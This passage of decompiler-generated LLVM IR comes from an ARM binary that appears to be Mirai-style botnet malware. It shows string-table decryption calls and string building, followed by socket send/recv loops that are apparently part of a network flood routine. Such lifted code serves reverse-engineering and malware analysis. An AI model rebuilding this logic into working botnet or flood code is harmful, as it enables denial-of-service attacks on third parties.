  store i1 %v9_8aac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8aac, label %dec_label_pc_8b84, label %dec_label_pc_8ab4

dec_label_pc_8ab4:                                ; preds = %dec_label_pc_88bc
  store i32 42, i32* %r0.global-to-local, align 4
  %v1_8ab8 = call i32 @table_unlock_val(i32 42)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8ac0 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_8ac4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8ac4, i32* %r1.global-to-local, align 4
  store i32 %v2_8ac0, i32* @r4, align 4
  store i32 42, i32* %r0.global-to-local, align 4
  %v2_8ad0 = inttoptr i32 %v0_8ac4 to i32*
  %v3_8ad0 = call i32 @table_retrieve_val(i32 42, i32* %v2_8ad0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 %v3_8ad0, i32* %r1.global-to-local, align 4
  %v1_8adc = load i32, i32* @r4, align 4
  %v2_8adc = add i32 %v1_8adc, %stack_var_-20860.0.ph
  store i32 %v2_8adc, i32* @r0, align 4
  %v2_8ae0 = inttoptr i32 %v2_8adc to i8*
  %v3_8ae0 = call i32 @util_strcpy(i8* %v2_8ae0, i32 %v3_8ad0)
  store i32 42, i32* %r0.global-to-local, align 4
  %v1_8ae8 = call i32 @table_lock_val(i32 42)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8af0 = call i32 @util_strlen(i8* %v1_88f0)
  %v2_8af8 = add i32 %v2_8af0, %stack_var_-20860.0.ph
  store i32 %v2_8af8, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r1.global-to-local, align 4
  %v3_8b00 = inttoptr i32 %v2_8af8 to i8*
  %v4_8b00 = call i32 @util_strcpy(i8* %v3_8b00, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b08 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_8b0c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8b0c, i32* %r1.global-to-local, align 4
  store i32 %v2_8b08, i32* %r4.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v2_8b18 = inttoptr i32 %v0_8b0c to i32*
  %v3_8b18 = call i32 @table_retrieve_val(i32 47, i32* %v2_8b18)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8b18, i32* %r1.global-to-local, align 4
  %v2_8b24 = add i32 %v2_8b08, %stack_var_-20860.0.ph
  store i32 %v2_8b24, i32* @r0, align 4
  %v2_8b28 = inttoptr i32 %v2_8b24 to i8*
  %v3_8b28 = call i32 @util_strcpy(i8* %v2_8b28, i32 %v3_8b18)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b30 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a770.38 to i32), i32* %r1.global-to-local, align 4
  %v2_8b3c = add i32 %v2_8b30, %stack_var_-20860.0.ph
  store i32 %v2_8b3c, i32* @r0, align 4
  %v2_8b40 = inttoptr i32 %v2_8b3c to i8*
  %v3_8b40 = call i32 @util_strcpy(i8* %v2_8b40, i32 ptrtoint (i32* @global_var_1a770.38 to i32))
  store i32 %v6_81fc, i32* %r0.global-to-local, align 4
  %v2_8b48 = call i32 @util_strlen(i8* %v1_8b48)
  store i32 %v2_8b48, i32* @r4, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b54 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_8b60 = add i32 %v2_8b54, %stack_var_-20860.0.ph
  store i32 %v2_8b60, i32* %r2.global-to-local, align 4
  %v0_8b64 = load i32, i32* @r4, align 4
  store i32 %v0_8b64, i32* %r0.global-to-local, align 4
  %v3_8b68 = trunc i32 %v0_8b64 to i8
  %v4_8b68 = call i32 @util_itoa(i8 %v3_8b68, i32 10, i32 %v2_8b60)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b70 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r1.global-to-local, align 4
  %v2_8b7c = add i32 %v2_8b70, %stack_var_-20860.0.ph
  store i32 %v2_8b7c, i32* @r0, align 4
  %v3_8b80 = inttoptr i32 %v2_8b7c to i8*
  %v4_8b80 = call i32 @util_strcpy(i8* %v3_8b80, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32))
  store i32 %v4_8b80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8b84

dec_label_pc_8b84:                                ; preds = %dec_label_pc_88bc, %dec_label_pc_8ab4
  %v0_8b84 = load i32, i32* @r6, align 4
  %v1_8b84 = add i32 %v0_8b84, 16
  %v2_8b84 = inttoptr i32 %v1_8b84 to i32*
  %v3_8b84 = load i32, i32* %v2_8b84, align 4
  store i32 %v3_8b84, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8b88 = icmp eq i32 %v3_8b84, 0
  store i1 %v2_8b88, i1* %cpsr_z.global-to-local, align 1
  %tmp178 = icmp slt i32 %v3_8b84, 1
  br i1 %tmp178, label %dec_label_pc_8c30, label %dec_label_pc_8b90

dec_label_pc_8b90:                                ; preds = %dec_label_pc_8b84
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b94 = call i32 @util_strlen(i8* %v1_88f0)
  %v2_8b9c = add i32 %v2_8b94, %stack_var_-20860.0.ph
  store i32 %v2_8b9c, i32* @r0, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1a780.46 to i32), i32* %r1.global-to-local, align 4
  %v3_8ba4 = inttoptr i32 %v2_8b9c to i8*
  %v4_8ba4 = call i32 @util_strcpy(i8* %v3_8ba4, i32 ptrtoint ([9 x i8]* @global_var_1a780.46 to i32))
  store i32 %v4_8ba4, i32* %r0.global-to-local, align 4
  %v0_8ba8 = load i32, i32* @r6, align 4
  %v1_8ba8 = add i32 %v0_8ba8, 16
  %v2_8ba8 = inttoptr i32 %v1_8ba8 to i32*
  %v3_8ba8 = load i32, i32* %v2_8ba8, align 4
  store i32 %v3_8ba8, i32* %r3.global-to-local, align 4
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8bb0 = icmp eq i32 %v3_8ba8, 0
  store i1 %v2_8bb0, i1* %cpsr_z.global-to-local, align 1
  %v0_8bb4 = load i32, i32* %sb.global-to-local, align 4
  %v5_8bb4 = inttoptr i32 %v0_8bb4 to i8*
  store i8* %v5_8bb4, i8** %stack_var_-44, align 4
  %tmp179 = icmp slt i32 %v3_8ba8, 1
  br i1 %tmp179, label %dec_label_pc_8c18, label %dec_label_pc_8bbc

dec_label_pc_8bbc:                                ; preds = %dec_label_pc_8b90, %dec_label_pc_8bbc
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8bc0 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_8bc8 = load i8*, i8** %stack_var_-44, align 4
  %v4_8bc8 = ptrtoint i8* %v3_8bc8 to i32
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  %v1_8bd0 = and i32 %v4_8bc8, 33554432
  %v2_8bd0 = icmp ne i32 %v1_8bd0, 0
  store i1 %v2_8bd0, i1* %cpsr_c.global-to-local, align 1
  %v3_8bd0 = mul i32 %v4_8bc8, 128
  %v1_8bd4 = add i32 %v3_8bd0, 1472
  %v2_8bd8 = add i32 %v2_8bc0, %stack_var_-20860.0.ph
  store i32 %v2_8bd8, i32* @r0, align 4
  %v0_8bdc = load i32, i32* @r5, align 4
  %v2_8bdc = add i32 %v1_8bd4, %v0_8bdc
  store i32 %v2_8bdc, i32* %r1.global-to-local, align 4
  %v2_8be0 = inttoptr i32 %v2_8bd8 to i8*
  %v3_8be0 = call i32 @util_strcpy(i8* %v2_8be0, i32 %v2_8bdc)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8be8 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a78c.48 to i32), i32* %r1.global-to-local, align 4
  %v2_8bf4 = add i32 %v2_8be8, %stack_var_-20860.0.ph
  store i32 %v2_8bf4, i32* @r0, align 4
  %v3_8bf8 = inttoptr i32 %v2_8bf4 to i8*
  %v4_8bf8 = call i32 @util_strcpy(i8* %v3_8bf8, i32 ptrtoint ([3 x i8]* @global_var_1a78c.48 to i32))
  store i32 %v4_8bf8, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_8c00 = load i8*, i8** %stack_var_-44, align 4
  %v4_8c00 = ptrtoint i8* %v3_8c00 to i32
  store i32 %v4_8c00, i32* %r3.global-to-local, align 4
  %v0_8c04 = load i32, i32* @r6, align 4
  %v1_8c04 = add i32 %v0_8c04, 16
  %v2_8c04 = inttoptr i32 %v1_8c04 to i32*
  %v3_8c04 = load i32, i32* %v2_8c04, align 4
  store i32 %v3_8c04, i32* %r2.global-to-local, align 4
  %v1_8c08 = add i32 %v4_8c00, 1
  store i32 %v1_8c08, i32* %ip.global-to-local, align 4
  %v3_8c0c = icmp uge i32 %v3_8c04, %v1_8c08
  store i1 %v3_8c0c, i1* %cpsr_c.global-to-local, align 1
  %v9_8c0c = icmp eq i32 %v3_8c04, %v1_8c08
  store i1 %v9_8c0c, i1* %cpsr_z.global-to-local, align 1
  %v5_8c10 = inttoptr i32 %v1_8c08 to i8*
  store i8* %v5_8c10, i8** %stack_var_-44, align 4
  %v8_8c14 = icmp sgt i32 %v3_8c04, %v1_8c08
  br i1 %v8_8c14, label %dec_label_pc_8bbc, label %dec_label_pc_8c18

dec_label_pc_8c18:                                ; preds = %dec_label_pc_8bbc, %dec_label_pc_8b90
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c1c = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r1.global-to-local, align 4
  %v2_8c28 = add i32 %v2_8c1c, %stack_var_-20860.0.ph
  store i32 %v2_8c28, i32* @r0, align 4
  %v3_8c2c = inttoptr i32 %v2_8c28 to i8*
  %v4_8c2c = call i32 @util_strcpy(i8* %v3_8c2c, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32))
  store i32 %v4_8c2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c30

dec_label_pc_8c30:                                ; preds = %dec_label_pc_8b84, %dec_label_pc_8c18
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c34 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r1.global-to-local, align 4
  %v2_8c40 = add i32 %v2_8c34, %stack_var_-20860.0.ph
  store i32 %v2_8c40, i32* @r0, align 4
  %v3_8c44 = inttoptr i32 %v2_8c40 to i8*
  %v4_8c44 = call i32 @util_strcpy(i8* %v3_8c44, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32))
  store i32 %v4_8c44, i32* %r0.global-to-local, align 4
  store i32 %v6_81fc, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_8c4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8c4c, label %dec_label_pc_8c6c, label %dec_label_pc_8c54

dec_label_pc_8c54:                                ; preds = %dec_label_pc_8c30
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c58 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 %v6_81fc, i32* %r1.global-to-local, align 4
  %v2_8c64 = add i32 %v2_8c58, %stack_var_-20860.0.ph
  store i32 %v2_8c64, i32* @r0, align 4
  %v2_8c68 = inttoptr i32 %v2_8c64 to i8*
  %v3_8c68 = call i32 @util_strcpy(i8* %v2_8c68, i32 %v6_81fc)
  store i32 %v3_8c68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c6c

dec_label_pc_8c6c:                                ; preds = %dec_label_pc_8c30, %dec_label_pc_8c54
  %v0_8c6c = load i32, i32* @r5, align 4
  %v1_8c6c = add i32 %v0_8c6c, 1440
  store i32 %v1_8c6c, i32* %r4.global-to-local, align 4
  %v0_8c70 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8c70, i32* %r0.global-to-local, align 4
  store i32 %v1_8c6c, i32* %r1.global-to-local, align 4
  %v2_8c78 = inttoptr i32 %v0_8c70 to i8*
  %v3_8c78 = call i32 @util_strcmp(i8* %v2_8c78, i32 %v1_8c6c)
  store i32 %v3_8c78, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8c7c = icmp eq i32 %v3_8c78, 0
  store i1 %v2_8c7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8c7c, label %dec_label_pc_96bc, label %dec_label_pc_8c84

dec_label_pc_8c84:                                ; preds = %dec_label_pc_8c6c, %dec_label_pc_96bc
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v0_8c88 = load i32, i32* @r6, align 4
  %v1_8c88 = add i32 %v0_8c88, -1452
  %v2_8c88 = inttoptr i32 %v1_8c88 to i32*
  %v3_8c88 = load i32, i32* %v2_8c88, align 4
  store i32 %v3_8c88, i32* @r4, align 4
  %v2_8c8c = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v2_8c8c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8c9c = load i32, i32* @r4, align 4
  store i32 %v0_8c9c, i32* %r0.global-to-local, align 4
  %v4_8ca0 = call i32 @__libc_send(i32 %v0_8c9c, i32 %stack_var_-20860.0.ph, i32 %v2_8c8c, i32 16384)
  store i32 %v4_8ca0, i32* %r0.global-to-local, align 4
  %v0_8ca4 = load i32, i32* @r6, align 4
  %v1_8ca4 = add i32 %v0_8ca4, -1452
  %v2_8ca4 = inttoptr i32 %v1_8ca4 to i32*
  %v3_8ca4 = load i32, i32* %v2_8ca4, align 4
  store i32 %v3_8ca4, i32* %ip.global-to-local, align 4
  %v3_8cac = udiv i32 %v3_8ca4, 32
  store i32 %v2_8710, i32* %r1.global-to-local, align 4
  %v3_8cb4 = mul nuw nsw i32 %v3_8cac, 4
  %v2_8cb8 = add i32 %v3_8cb4, %v2_8710
  store i32 %v2_8cb8, i32* %r2.global-to-local, align 4
  %v1_8cbc = add i32 %v2_8cb8, -164
  %v2_8cbc = inttoptr i32 %v1_8cbc to i32*
  %v3_8cbc = load i32, i32* %v2_8cbc, align 4
  %v1_8cc4 = urem i32 %v3_8ca4, 32
  store i32 %v1_8cc4, i32* %r0.global-to-local, align 4
  %v7_8cc8 = shl i32 1, %v1_8cc4
  %v8_8cc8 = or i32 %v3_8cbc, %v7_8cc8
  store i32 %v8_8cc8, i32* @r1, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v8_8cc8, i32* %v2_8cbc, align 4
  %v0_8cd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_8cd4 = trunc i32 %v0_8cd4 to i8
  %v2_8cd4 = load i32, i32* @r6, align 4
  %v3_8cd4 = add i32 %v2_8cd4, -1448
  %v4_8cd4 = inttoptr i32 %v3_8cd4 to i8*
  store i8 %v1_8cd4, i8* %v4_8cd4, align 1
  %v0_8cd8 = load i32, i32* %ip.global-to-local, align 4
  %v1_8cd8 = load i32, i32* @r8, align 4
  %v2_8cd8 = sub i32 %v0_8cd8, %v1_8cd8
  %v3_8cd8 = icmp uge i32 %v0_8cd8, %v1_8cd8
  store i1 %v3_8cd8, i1* %cpsr_c.global-to-local, align 1
  %v4_8cd8 = xor i32 %v1_8cd8, %v0_8cd8
  %v5_8cd8 = xor i32 %v2_8cd8, %v0_8cd8
  %v6_8cd8 = and i32 %v5_8cd8, %v4_8cd8
  %v7_8cd8 = icmp slt i32 %v6_8cd8, 0
  %v8_8cd8 = icmp slt i32 %v2_8cd8, 0
  %v9_8cd8 = icmp eq i32 %v0_8cd8, %v1_8cd8
  store i1 %v9_8cd8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8530, i32* %r2.global-to-local, align 4
  %v3_8ce0 = xor i1 %v8_8cd8, %v7_8cd8
  %v4_8ce0 = or i1 %v9_8cd8, %v3_8ce0
  br i1 %v4_8ce0, label %bb181, label %bb180

bb180:                                            ; preds = %dec_label_pc_8c84
  %v6_8ce0 = add i32 %v0_8cd8, 1
  store i32 %v6_8ce0, i32* @r8, align 4
  br label %bb181

bb181:                                            ; preds = %dec_label_pc_8c84, %bb180
  %v1_8ce4 = load i32, i32* @r6, align 4
  %v2_8ce4 = add i32 %v1_8ce4, -1440
  %v3_8ce4 = inttoptr i32 %v2_8ce4 to i32*
  store i32 %v2_8530, i32* %v3_8ce4, align 4
  br label %dec_label_pc_85f4

dec_label_pc_8cec:                                ; preds = %dec_label_pc_85ac
  %v1_8cec = add i32 %v3_88b0, -1444
  %v2_8cec = inttoptr i32 %v1_8cec to i32*
  %v3_8cec = load i32, i32* %v2_8cec, align 4
  store i32 %v2_8530, i32* @r1, align 4
  %v2_8cf4 = sub i32 %v2_8530, %v3_8cec
  store i32 %v2_8cf4, i32* %r3.global-to-local, align 4
  %v2_8cf8 = icmp ugt i32 %v2_8cf4, 29
  store i1 %v2_8cf8, i1* %cpsr_c.global-to-local, align 1
  %v7_8cf8 = icmp eq i32 %v2_8cf4, 30
  store i1 %v7_8cf8, i1* %cpsr_z.global-to-local, align 1
  %v2_8cfc = xor i1 %v7_8cf8, true
  %v3_8cfc = and i1 %v2_8cf8, %v2_8cfc
  br i1 %v3_8cfc, label %dec_label_pc_85dc, label %dec_label_pc_8d00

dec_label_pc_8d00:                                ; preds = %dec_label_pc_8cec
  %v2_8d00 = inttoptr i32 %v1_8618 to i32*
  %v3_8d00 = load i32, i32* %v2_8d00, align 4
  store i32 %v3_8d00, i32* %ip.global-to-local, align 4
  %v3_8d08 = udiv i32 %v3_8d00, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8d0c = mul nuw nsw i32 %v3_8d08, 4
  store i32 %v3_8d0c, i32* %r2.global-to-local, align 4
  store i32 %v2_8710, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8718

dec_label_pc_8d1c:                                ; preds = %dec_label_pc_85bc
  %v2_8d1c = inttoptr i32 %v1_8618 to i32*
  %v3_8d1c = load i32, i32* %v2_8d1c, align 4
  store i32 %v3_8d1c, i32* %ip.global-to-local, align 4
  %v3_8d24 = udiv i32 %v3_8d1c, 32
  store i32 %v2_8710, i32* %r3.global-to-local, align 4
  %v3_8d2c = mul nuw nsw i32 %v3_8d24, 4
  %v2_8d30 = add i32 %v3_8d2c, %v2_8710
  store i32 %v2_8d30, i32* %r2.global-to-local, align 4
  %v1_8d34 = add i32 %v2_8d30, -164
  %v2_8d34 = inttoptr i32 %v1_8d34 to i32*
  %v3_8d34 = load i32, i32* %v2_8d34, align 4
  %v1_8d38 = urem i32 %v3_8d1c, 32
  store i32 %v1_8d38, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_8d40 = shl i32 1, %v1_8d38
  %v8_8d40 = or i32 %v3_8d34, %v7_8d40
  store i32 %v8_8d40, i32* @r1, align 4
  %v1_8d44 = load i32, i32* @r8, align 4
  %v2_8d44 = sub i32 %v3_8d1c, %v1_8d44
  %v3_8d44 = icmp uge i32 %v3_8d1c, %v1_8d44
  store i1 %v3_8d44, i1* %cpsr_c.global-to-local, align 1
  %v4_8d44 = xor i32 %v1_8d44, %v3_8d1c
  %v5_8d44 = xor i32 %v2_8d44, %v3_8d1c
  %v6_8d44 = and i32 %v5_8d44, %v4_8d44
  %v7_8d44 = icmp slt i32 %v6_8d44, 0
  %v8_8d44 = icmp slt i32 %v2_8d44, 0
  %v9_8d44 = icmp eq i32 %v3_8d1c, %v1_8d44
  store i1 %v9_8d44, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8d40, i32* %v2_8d34, align 4
  %v3_8d4c = xor i1 %v8_8d44, %v7_8d44
  %v4_8d4c = or i1 %v9_8d44, %v3_8d4c
  br i1 %v4_8d4c, label %dec_label_pc_85f4, label %dec_label_pc_8d50

dec_label_pc_8d50:                                ; preds = %dec_label_pc_8d1c
  %v0_8d50 = load i32, i32* %ip.global-to-local, align 4
  %v1_8d50 = load i32, i32* %r3.global-to-local, align 4
  %v2_8d50 = add i32 %v1_8d50, %v0_8d50
  store i32 %v2_8d50, i32* @r8, align 4
  br label %dec_label_pc_8738

dec_label_pc_8d58:                                ; preds = %dec_label_pc_87dc
  %v0_8d58 = call i32 @__GI___errno_location()
  store i32 %v0_8d58, i32* %r0.global-to-local, align 4
  %v0_8d5c = load i32, i32* @sl, align 4
  %v1_8d5c = add i32 %v0_8d5c, 660
  %v2_8d5c = inttoptr i32 %v1_8d5c to i32*
  %v3_8d5c = load i32, i32* %v2_8d5c, align 4
  store i32 %v3_8d5c, i32* @r3, align 4
  %v0_8d60 = load i32, i32* %sb.global-to-local, align 4
  %v2_8d64 = icmp ugt i32 %v3_8d5c, 1023
  store i1 %v2_8d64, i1* %cpsr_c.global-to-local, align 1
  %v7_8d64 = icmp eq i32 %v3_8d5c, 1024
  store i1 %v7_8d64, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_8d58, i32* %fp.global-to-local, align 4
  %v1_8d6c = add i32 %v0_8d60, 2116
  store i32 %v1_8d6c, i32* @r7, align 4
  br i1 %v7_8d64, label %dec_label_pc_8e70, label %dec_label_pc_8d74

dec_label_pc_8d74:                                ; preds = %dec_label_pc_8d58, %dec_label_pc_8e70, %dec_label_pc_8e64
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_8d78 = load i32, i32* %fp.global-to-local, align 4
  %v2_8d78 = inttoptr i32 %v1_8d78 to i32*
  store i32 0, i32* %v2_8d78, align 4
  %v0_8d7c = load i32, i32* @sl, align 4
  %v1_8d7c = add i32 %v0_8d7c, 660
  %v2_8d7c = inttoptr i32 %v1_8d7c to i32*
  %v3_8d7c = load i32, i32* %v2_8d7c, align 4
  store i32 %v3_8d7c, i32* %r1.global-to-local, align 4
  %v1_8d80 = add i32 %v0_8d7c, -1452
  %v2_8d80 = inttoptr i32 %v1_8d80 to i32*
  %v3_8d80 = load i32, i32* %v2_8d80, align 4
  store i32 %v3_8d80, i32* %r0.global-to-local, align 4
  %v1_8d84 = sub i32 1024, %v3_8d7c
  store i32 %v1_8d84, i32* %r2.global-to-local, align 4
  %v0_8d88 = load i32, i32* %r3.global-to-local, align 4
  %v1_8d88 = add i32 %v0_8d88, 16384
  store i32 %v1_8d88, i32* %r3.global-to-local, align 4
  %v0_8d8c = load i32, i32* @r7, align 4
  %v2_8d8c = add i32 %v0_8d8c, %v3_8d7c
  store i32 %v2_8d8c, i32* %r1.global-to-local, align 4
  %v4_8d90 = call i32 @__libc_recv(i32 %v3_8d80, i32 %v2_8d8c, i32 %v1_8d84, i32 %v1_8d88)
  store i32 %v4_8d90, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8d94 = icmp eq i32 %v4_8d90, 0
  store i1 %v2_8d94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8d94, label %dec_label_pc_96cc, label %dec_label_pc_8d9c

dec_label_pc_8d9c:                                ; preds = %dec_label_pc_8d74
  %v2_8d9c = icmp eq i32 %v4_8d90, -1
  store i1 %v2_8d9c, i1* %cpsr_c.global-to-local, align 1
  %v7_8d9c = icmp eq i32 %v4_8d90, -1
  store i1 %v7_8d9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8d9c, label %dec_label_pc_96f0, label %dec_label_pc_8da4

dec_label_pc_8da4:                                ; preds = %dec_label_pc_8d9c
  %v0_8da4 = load i32, i32* @sl, align 4
  %v1_8da4 = add i32 %v0_8da4, 660
  %v2_8da4 = inttoptr i32 %v1_8da4 to i32*
  %v3_8da4 = load i32, i32* %v2_8da4, align 4
  store i32 %v2_879c, i32* %r1.global-to-local, align 4
  %v2_8dac = add i32 %v3_8da4, %v4_8d90
  store i32 %v2_8dac, i32* @r4, align 4
  store i32 %v2_8dac, i32* %v2_8da4, align 4
  %v0_8db4 = load i32, i32* %r1.global-to-local, align 4
  %v1_8db4 = load i32, i32* @sl, align 4
  %v2_8db4 = add i32 %v1_8db4, -1444
  %v3_8db4 = inttoptr i32 %v2_8db4 to i32*
  store i32 %v0_8db4, i32* %v3_8db4, align 4
  br label %dec_label_pc_8e44

dec_label_pc_8dbc:                                ; preds = %dec_label_pc_8e44
  %v1_8dbc = inttoptr i32 %v0_8e44 to i32*
  %v2_8dbc = load i32, i32* %v1_8dbc, align 4
  store i32 %v2_8dbc, i32* @r8, align 4
  %v1_8dc0 = load i32, i32* @r4, align 4
  %v5_8dc4 = icmp slt i32 %v3_8e44, %v1_8dc0
  %storemerge50 = select i1 %v5_8dc4, i32 %v3_8e44, i32 %v1_8dc0
  store i32 %storemerge50, i32* @r6, align 4
  %v2_8dcc = sub i32 %v3_8e44, %storemerge50
  store i32 %v2_8dcc, i32* %r3.global-to-local, align 4
  %v2_8dd0 = icmp ne i32 %v2_8dbc, 0
  store i1 %v2_8dd0, i1* %cpsr_c.global-to-local, align 1
  %v7_8dd0 = icmp eq i32 %v2_8dbc, 1
  store i1 %v7_8dd0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8dcc, i32* %v2_8e44, align 4
  br i1 %v7_8dd0, label %dec_label_pc_8e94, label %.dec_label_pc_8de0thread-pre-split_crit_edge

.dec_label_pc_8de0thread-pre-split_crit_edge:     ; preds = %dec_label_pc_8dbc
  %v1_8dd8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_8dd8, i32* @r5, align 4
  br label %dec_label_pc_8de0

dec_label_pc_8de0:                                ; preds = %dec_label_pc_8e50, %.dec_label_pc_8de0thread-pre-split_crit_edge, %dec_label_pc_8ebc
  %v0_8de0 = phi i32 [ %v3_8ebc, %dec_label_pc_8ebc ], [ %v1_8dd8, %.dec_label_pc_8de0thread-pre-split_crit_edge ], [ %v3_8e44, %dec_label_pc_8e50 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8de0 = icmp eq i32 %v0_8de0, 0
  store i1 %v2_8de0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8de0, label %dec_label_pc_8de8, label %dec_label_pc_8e08

dec_label_pc_8de8:                                ; preds = %dec_label_pc_8de0
  %v0_8de8 = load i32, i32* @sl, align 4
  %v1_8de8 = add i32 %v0_8de8, 8
  %v2_8de8 = inttoptr i32 %v1_8de8 to i32*
  %v3_8de8 = load i32, i32* %v2_8de8, align 4
  store i32 %v3_8de8, i32* @r4, align 4
  %v2_8dec = icmp ne i32 %v3_8de8, 0
  store i1 %v2_8dec, i1* %cpsr_c.global-to-local, align 1
  %v7_8dec = icmp eq i32 %v3_8de8, 1
  store i1 %v7_8dec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8dec, label %dec_label_pc_8ec4, label %dec_label_pc_8df4

dec_label_pc_8df4:                                ; preds = %dec_label_pc_8de8
  %v1_8df4 = add i32 %v0_8de8, 660
  %v2_8df4 = inttoptr i32 %v1_8df4 to i32*
  %v3_8df4 = load i32, i32* %v2_8df4, align 4
  %v0_8df8 = load i32, i32* @r6, align 4
  %v2_8df8 = sub i32 %v3_8df4, %v0_8df8
  store i32 %v2_8df8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8dfc = icmp eq i32 %v2_8df8, 0
  store i1 %v2_8dfc, i1* %cpsr_z.global-to-local, align 1
  %v2_8e00 = add i32 %v0_8de8, 12
  %v3_8e00 = inttoptr i32 %v2_8e00 to i32*
  store i32 %v2_8df8, i32* %v3_8e00, align 4
  br i1 %v2_8dfc, label %dec_label_pc_96b0, label %dec_label_pc_8e08

dec_label_pc_8e08:                                ; preds = %dec_label_pc_8de0, %dec_label_pc_8ec4, %dec_label_pc_8df4, %dec_label_pc_8f4c
  %v0_8e08 = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e08 = icmp eq i32 %v0_8e08, 0
  store i1 %v2_8e08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8e08, label %dec_label_pc_8e58, label %dec_label_pc_8e10

dec_label_pc_8e10:                                ; preds = %dec_label_pc_8e08
  %v0_8e10 = load i32, i32* @sl, align 4
  %v1_8e10 = add i32 %v0_8e10, 660
  %v2_8e10 = inttoptr i32 %v1_8e10 to i32*
  %v3_8e10 = load i32, i32* %v2_8e10, align 4
